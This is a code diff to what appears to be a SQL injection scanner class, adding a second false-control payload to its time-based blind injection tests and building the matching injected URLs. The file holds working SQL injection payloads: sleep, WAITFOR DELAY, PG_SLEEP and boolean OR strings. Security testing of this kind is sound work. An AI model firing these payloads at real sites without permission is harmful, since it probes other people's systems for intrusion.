@@ -23,14 +23,15 @@ class SqliManager:
         self._error_based_payloads = ['\'', '\\', '"', '%27', '%5C', '%2F']
         self._time_based_payloads = [
             {'TruePld': '\'OR(if(1=1,sleep(5),0))OR\'', 'FalsePld': '\'OR(if(1=2,sleep(5),0))OR\'',
-             'True2Pld': '\'OR(if(2=2,sleep(5),0))OR\''},
+             'True2Pld': '\'OR(if(2=2,sleep(5),0))OR\'', 'False2Pld': '\'OR(if(1=3,sleep(5),0))OR\''},
             {'TruePld': '"OR(if(1=1,sleep(5),0))OR"', 'FalsePld': '"OR(if(1=2,sleep(5),0))OR"',
-             'True2Pld': '"OR(if(2=2,sleep(5),0))OR"'},
+             'True2Pld': '"OR(if(2=2,sleep(5),0))OR"', 'False2Pld': '"OR(if(1=3,sleep(5),0))OR"'},
             {'TruePld': '1\'; WAITFOR DELAY \'00:00:05', 'FalsePld': '1\'; WAITFOR DELAY \'00:00:00',
-             'True2Pld': '1\'; WAITFOR DELAY \'00:00:08'},
+             'True2Pld': '1\'; WAITFOR DELAY \'00:00:08', 'False2Pld': '2\'; WAITFOR DELAY \'00:00:00'},
             {'TruePld': '\' OR \'1\'>(SELECT \'1\' FROM PG_SLEEP(5)) OR \'',
              'FalsePld': '\' OR \'1\'>(SELECT \'1\' FROM PG_SLEEP(0)) OR \'',
-             'True2Pld': '\' OR \'1\'>(SELECT \'1\' FROM PG_SLEEP(6)) OR \''},
+             'True2Pld': '\' OR \'1\'>(SELECT \'1\' FROM PG_SLEEP(6)) OR \'',
+             'False2Pld': '\' OR \'1\'>(SELECT \'2\' FROM PG_SLEEP(0)) OR \''},
         ]
         self._bool_based_payloads = [
             {'TruePld': '\'OR(1=1)OR\'', 'FalsePld': '\'OR(1=2)OR\'', 'True2Pld': '\'OR(2=2)OR\'',
@@ -184,7 +185,13 @@ class SqliManager:
                 new_route_parts[index] = payload_part
                 true2_new_url = f'{parsed.scheme}://{parsed.netloc}/{"/".join(new_route_parts)}?{parsed.query}'
 
-                result.append({'TruePld': true_new_url, 'FalsePld': false_new_url,'True2Pld': true2_new_url})
+                payload_part = f'{part}{payloads["False2Pld"]}'
+                new_route_parts = deepcopy(route_parts)
+                new_route_parts[index] = payload_part
+                false2_new_url = f'{parsed.scheme}://{parsed.netloc}/{"/".join(new_route_parts)}?{parsed.query}'
+
+                result.append({'TruePld': true_new_url, 'FalsePld': false_new_url,
+                               'True2Pld': true2_new_url, 'False2Pld': false2_new_url})
 
         return result
 
